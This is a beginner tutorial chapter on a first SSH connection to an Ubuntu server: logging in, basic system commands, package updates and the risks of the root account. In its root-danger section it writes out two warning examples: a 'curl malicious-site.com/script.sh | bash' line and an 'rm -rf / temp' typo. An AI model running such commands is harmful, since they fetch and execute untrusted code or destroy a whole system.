# Chapter 5: First Connection to Your Server

**Connecting via SSH and Running Your First Commands**

---

## Learning Objectives

By the end of this chapter, you'll be able to:
- ✅ Connect to your server via SSH
- ✅ Understand the root user
- ✅ Navigate your new server
- ✅ Run basic system commands
- ✅ Update the system
- ✅ Understand remote vs local commands

**Time Required:** 20-30 minutes

---

## What is SSH?

### Secure Shell Explained

**SSH = Secure Shell**

**What it does:**
- Connects your computer to remote server
- Encrypted connection (secure)
- Command line access
- Like having a terminal window on the server

**Real-world analogy:**
- **Your computer** = Your office
- **SSH** = Secure phone line
- **Server** = Remote office
- **Commands** = Instructions you give over the phone

**Everything you type goes to the server, not your local computer!**

---

## Understanding Connection Details

### What You Need to Connect

**Three pieces of information:**

1. **Server IP Address**
   - Example: `192.0.2.100`
   - From DigitalOcean dashboard
   - Your server's public address

2. **Username**
   - Initially: `root`
   - Full administrator access
   - We'll create a regular user in Chapter 6

3. **SSH Private Key**
   - File: `~/.ssh/id_ed25519`
   - Like a password, but more secure
   - Never share this!

---

## First Connection

### From Mac/Linux

**Open Terminal** (Applications → Utilities → Terminal)

**Connect command:**
```bash
ssh root@YOUR_SERVER_IP
```

**Example:**
```bash
ssh root@192.0.2.100
```

**First time connecting, you'll see:**
```
The authenticity of host '192.0.2.100 (192.0.2.100)' can't be established.
ED25519 key fingerprint is SHA256:abcd1234...
Are you sure you want to continue connecting (yes/no/[fingerprint])?
```

**Type:** `yes` and press Enter

**Why this appears:**
- SSH verifying server identity
- Prevents man-in-the-middle attacks
- Only happens first time
- Stored in `~/.ssh/known_hosts`

**If connection successful:**
```
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.5.0-10-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

root@mywebclass-prod:~#
```

**You're in!** 🎉

---

### From Windows

#### Option A: Windows Terminal/PowerShell (Windows 10/11)

**1. Open PowerShell or Windows Terminal**

**2. Connect:**
```powershell
ssh root@YOUR_SERVER_IP
```

**Same process as Mac/Linux!**

Windows 10/11 has OpenSSH built-in.

---

#### Option B: PuTTY

**If OpenSSH not available:**

**1. Download PuTTY:**
https://www.putty.org/

**2. Open PuTTY**

**3. Configure connection:**
- **Host Name:** root@YOUR_SERVER_IP
- **Port:** 22
- **Connection Type:** SSH

**4. Configure key (if using .ppk):**
- Connection → SSH → Auth
- Browse for private key (.ppk file)

**5. Click "Open"**

**6. Accept host key** (first time)

**7. Connected!**

---

### Understanding the Prompt

**What you see:**
```
root@mywebclass-prod:~#
```

**Breaking it down:**
- `root` = Current user (administrator)
- `@` = Separator
- `mywebclass-prod` = Server hostname
- `~` = Current directory (home)
- `#` = Root user ($ for regular users)

**This means:**
- You're connected to the server
- Commands run on the SERVER, not your computer
- You have full administrator access

---

## Your First Commands

### Verify You're Connected

**1. Check who you are:**
```bash
whoami
```

**Output:**
```
root
```

**2. Check server hostname:**
```bash
hostname
```

**Output:**
```
mywebclass-prod
```

**3. Check server IP:**
```bash
hostname -I
```

**Output:**
```
192.0.2.100 10.10.0.5
```

**4. Check OS version:**
```bash
lsb_release -a
```

**Output:**
```
Distributor ID: Ubuntu
Description:    Ubuntu 24.04 LTS
Release:        24.04
Codename:       noble
```

---

### Explore the System

**1. Where are you?**
```bash
pwd
```

**Output:**
```
/root
```

This is root user's home directory.

**2. What's here?**
```bash
ls -la
```

**Probably empty** (new server).

**3. Check disk space:**
```bash
df -h
```

**Output example:**
```
Filesystem      Size  Used Avail Use% Mounted on
/dev/vda1        25G  1.8G   23G   8% /
```

**4. Check memory:**
```bash
free -h
```

**Output example:**
```
              total        used        free      shared  buff/cache   available
Mem:          2.0Gi       150Mi       1.5Gi       1.0Mi       350Mi       1.7Gi
Swap:            0B          0B          0B
```

**5. Check CPU info:**
```bash
lscpu | grep "Model name"
```

---

## System Update

### Why Update First?

**Always update immediately after creating server:**
- Security patches
- Bug fixes
- Latest packages
- Fresh start

**This is critical!** New servers may have outdated packages.

---

### Update Process

**Step 1: Update package list**
```bash
apt update
```

**What it does:**
- Contacts package repositories
- Downloads list of available updates
- Doesn't install anything yet

**Output:**
```
Hit:1 http://mirrors.digitalocean.com/ubuntu noble InRelease
Get:2 http://security.ubuntu.com/ubuntu noble-security InRelease [126 kB]
...
Reading package lists... Done
Building dependency tree... Done
32 packages can be upgraded. Run 'apt list --upgradable' to see them.
```

---

**Step 2: Upgrade all packages**
```bash
apt upgrade -y
```

**What `-y` does:** Automatically answers "yes" to prompts.

**Output:**
```
Reading package lists... Done
Building dependency tree... Done
Calculating upgrade... Done
The following packages will be upgraded:
  base-files cloud-init libc6 linux-image-generic ...
32 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 125 MB of archives.
After this operation, 15.2 MB of additional disk space will be used.
```

**This takes 2-5 minutes.** Be patient!

**You may see:**
- Package download progress
- Configuration questions (usually safe to keep defaults)
- Service restart notifications

---

**Step 3: Dist upgrade (optional but recommended)**
```bash
apt dist-upgrade -y
```

**What it does:**
- Smarter upgrade
- Handles dependencies better
- May install/remove packages

**Usually safe on new server.**

---

**Step 4: Remove unnecessary packages**
```bash
apt autoremove -y
```

**What it does:**
- Removes packages no longer needed
- Frees disk space
- Cleans up

---

**Step 5: Reboot (if kernel updated)**

**Check if reboot needed:**
```bash
ls -l /var/run/reboot-required
```

**If file exists, reboot:**
```bash
reboot
```

**What happens:**
- Connection closes
- Server reboots
- Takes 1-2 minutes
- Reconnect after reboot

**Reconnect:**
```bash
ssh root@YOUR_SERVER_IP
```

---

### Post-Update Verification

**1. Check updates:**
```bash
apt update
apt list --upgradable
```

**Should say:** `All packages are up to date.`

**2. Check kernel version:**
```bash
uname -r
```

**3. Check system time:**
```bash
timedatectl
```

**Should show correct timezone.**

---

## Understanding Root User

### What is Root?

**Root = Superuser = Administrator**

**Root can:**
- ✅ Install/remove any software
- ✅ Modify any file
- ✅ Change any setting
- ✅ Delete entire system
- ✅ Read anyone's files

**With great power comes great responsibility!**

---

### Why Root is Dangerous

**Problem scenarios:**

**Typo disaster:**
```bash
# Meant to type:
rm -rf ./temp

# Actually typed:
rm -rf / temp    # DELETES EVERYTHING!
```

**Copy-paste error:**
```bash
# Found online, looks helpful
curl malicious-site.com/script.sh | bash
# Actually installs malware
```

**Accident:**
```bash
# Meant to edit user's file
nano /home/user/config.txt

# Actually edited system file
nano /etc/config.txt
```

**No protection!** Root has no safety net.

---

### Best Practices

**✅ Do:**
- Create regular user (Chapter 6)
- Use sudo for admin tasks
- Test commands first
- Double-check before destructive operations

**❌ Don't:**
- Use root for daily tasks
- Run untrusted scripts as root
- Enable root SSH after setup (Chapter 7)
- Share root access

**Rule:** Use root only when necessary, use sudo otherwise.

---

## Local vs Remote Commands

### Understanding Where Commands Run

**Important concept:** After SSH connection, everything runs on SERVER.

**Common confusion:**

**❌ Wrong thinking:**
```bash
# Student thinks:
cd /Users/alice/projects     # This is LOCAL path!
# Error: directory doesn't exist
```

**✅ Correct:**
```bash
# On SERVER:
cd /home/username/projects   # Server path
```

---

### How to Tell Where You Are

**Look at the prompt:**

**On your computer (local):**
```
alice@laptop:~$
```

**On the server (remote):**
```
root@mywebclass-prod:~#
```

**If confused:**
```bash
hostname    # Shows current machine name
```

---

### Multiple Terminal Windows

**Pro tip:** Use multiple terminal windows:

**Window 1: SSH connection (remote)**
```
root@mywebclass-prod:~#
```

**Window 2: Local commands**
```
alice@laptop:~$
```

**This helps:**
- Test locally first
- Transfer files
- Compare configurations
- Reduce confusion

---

## Basic Server Information

### System Info Commands

**OS details:**
```bash
cat /etc/os-release
```

**Kernel version:**
```bash
uname -a
```

**Architecture:**
```bash
dpkg --print-architecture
```

**Hostname:**
```bash
hostnamectl
```

**Network interfaces:**
```bash
ip addr show
```

**Public IP (from server's perspective):**
```bash
curl ifconfig.me
```

---

### Resource Monitoring

**CPU usage:**
```bash
top
# Press 'q' to quit
```

**Better alternative:**
```bash
htop
# Install if needed: apt install htop -y
```

**Disk usage:**
```bash
df -h           # File systems
du -sh /*       # Top-level directories
```

**Memory details:**
```bash
free -h
cat /proc/meminfo
```

**Running processes:**
```bash
ps aux
ps aux | grep apache  # Find specific process
```

---

## Package Management Basics

### APT (Advanced Package Tool)

**What is APT?**
- Ubuntu's package manager
- Installs/removes software
- Handles dependencies
- Like App Store for servers

**Common commands:**

**Search for package:**
```bash
apt search nginx
```

**Show package info:**
```bash
apt show nginx
```

**Install package:**
```bash
apt install package-name -y
```

**Remove package:**
```bash
apt remove package-name -y
```

**Purge (remove with configs):**
```bash
apt purge package-name -y
```

**List installed:**
```bash
apt list --installed
```

**Check if installed:**
```bash
dpkg -l | grep package-name
```

---

## Disconnecting from Server

### How to Exit

**Method 1: Type exit**
```bash
exit
```

**Method 2: Press Ctrl+D**

**Method 3: Close terminal** (not recommended)

**What happens:**
- SSH connection closes
- Returns to local prompt
- Server keeps running

**Server doesn't stop when you disconnect!**

---

### Reconnecting

**Just use SSH again:**
```bash
ssh root@YOUR_SERVER_IP
```

**Your server is:**
- Still running
- Always accessible (24/7)
- Using resources (costing money)

---

## Common First-Connection Issues

### Problem: Connection Refused

**Error:**
```
ssh: connect to host 192.0.2.100 port 22: Connection refused
```

**Possible causes:**
1. Server not fully booted yet (wait 2-3 minutes)
2. Wrong IP address (check DigitalOcean dashboard)
3. Firewall blocking (unlikely on DigitalOcean)

**Solution:**
```bash
# Wait a minute, then try again
sleep 60
ssh root@YOUR_SERVER_IP
```

---

### Problem: Permission Denied (publickey)

**Error:**
```
Permission denied (publickey)
```

**Cause:** SSH key not recognized

**Solutions:**

**1. Verify key was added to DigitalOcean:**
- Check DigitalOcean dashboard
- Settings → Security → SSH Keys

**2. Specify key explicitly:**
```bash
ssh -i ~/.ssh/id_ed25519 root@YOUR_SERVER_IP
```

**3. Check key permissions:**
```bash
chmod 600 ~/.ssh/id_ed25519
chmod 644 ~/.ssh/id_ed25519.pub
```

**4. Use console (emergency):**
- DigitalOcean dashboard → Droplet → Console
- Log in with root password (emailed)
- Manually add SSH key

---

### Problem: Host Key Verification Failed

**Error:**
```
WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!
```

**Cause:** Server was recreated with same IP

**Solution:**
```bash
ssh-keygen -R YOUR_SERVER_IP
```

**Then reconnect.**

**⚠️ Only do this if you know why the key changed!**

---

### Problem: Connection Timeout

**Error:**
```
ssh: connect to host 192.0.2.100 port 22: Operation timed out
```

**Possible causes:**
1. Server is down
2. Network issue
3. Your firewall blocking

**Solutions:**
```bash
# Test connectivity
ping YOUR_SERVER_IP

# Check server status in DigitalOcean dashboard
# Try from different network (mobile hotspot)
```

---

### Problem: Too Many Authentication Failures

**Error:**
```
Received disconnect from 192.0.2.100: Too many authentication failures
```

**Cause:** SSH trying too many keys

**Solution:**
```bash
ssh -o IdentitiesOnly=yes -i ~/.ssh/id_ed25519 root@YOUR_SERVER_IP
```

---

## Verification Checklist

**Before moving to Chapter 6:**

- ✅ Successfully connected via SSH
- ✅ Ran `whoami` and saw `root`
- ✅ Ran `hostname` and saw your server name
- ✅ Updated system with `apt update && apt upgrade`
- ✅ Checked disk space with `df -h`
- ✅ Checked memory with `free -h`
- ✅ Successfully disconnected and reconnected
- ✅ Understand local vs remote commands

---

## Practice Exercises

### Exercise 1: Explore Your Server

```bash
# 1. Connect
ssh root@YOUR_SERVER_IP

# 2. Check where you are
pwd

# 3. List files
ls -la

# 4. Check system info
uname -a
cat /etc/os-release

# 5. Check resources
df -h
free -h

# 6. Disconnect
exit
```

---

### Exercise 2: Update Practice

```bash
# Connect
ssh root@YOUR_SERVER_IP

# Update (already done, but review)
apt update
apt list --upgradable

# Check for security updates
apt list --upgradable | grep security

# Disconnect
exit
```

---

### Exercise 3: Command History

```bash
# Connect
ssh root@YOUR_SERVER_IP

# View command history
history

# Run previous command
!!

# Search history
history | grep apt

# Disconnect
exit
```

---

## Security Notes

### What We Learned

**Good practices:**
- ✅ Using SSH keys (not passwords)
- ✅ Updating immediately
- ✅ Understanding root access

**Still to do (next chapters):**
- Create regular user
- Disable root SSH login
- Configure firewall
- Install fail2ban

**Right now, server is vulnerable:**
- Root login enabled
- No firewall
- Default SSH port
- One-user system

**Don't deploy anything yet!** We'll secure it first.

---

## Key Takeaways

**Remember:**

1. **SSH connects your computer to server**
   - Commands run on server, not locally
   - Look at prompt to know where you are

2. **Root is powerful and dangerous**
   - Can do anything
   - No undo for mistakes
   - Create regular user next

3. **Update immediately**
   - `apt update && apt upgrade -y`
   - Security patches critical
   - Reboot if kernel updated

4. **Server runs 24/7**
   - Disconnecting doesn't stop it
   - Always accessible
   - Costs money while running

5. **Multiple terminals helpful**
   - One for SSH connection
   - One for local commands
   - Reduces confusion

---

## Next Steps

**You now have:**
- ✅ Working SSH connection
- ✅ Updated system
- ✅ Basic server knowledge
- ✅ Comfort with remote access

**In Chapter 6:**
- Create regular user account
- Set up sudo access
- Generate SSH keys for new user
- Understand user security

**Don't skip Chapter 6!** Using root for everything is dangerous. We'll create a proper user account.

---

## Quick Reference

### Essential Commands

```bash
# Connect
ssh root@YOUR_SERVER_IP

# Update system
apt update
apt upgrade -y
apt autoremove -y

# Check resources
df -h           # Disk space
free -h         # Memory
top             # Processes

# System info
whoami          # Current user
hostname        # Server name
uname -a        # Kernel version

# Disconnect
exit            # or Ctrl+D
```

### Connection String (save this)
```
ssh root@___.___.___.___ 
```

---

[← Previous: Chapter 4 - DigitalOcean Setup](04-digitalocean-setup.md) | [Next: Chapter 6 - User Management →](06-user-management.md)
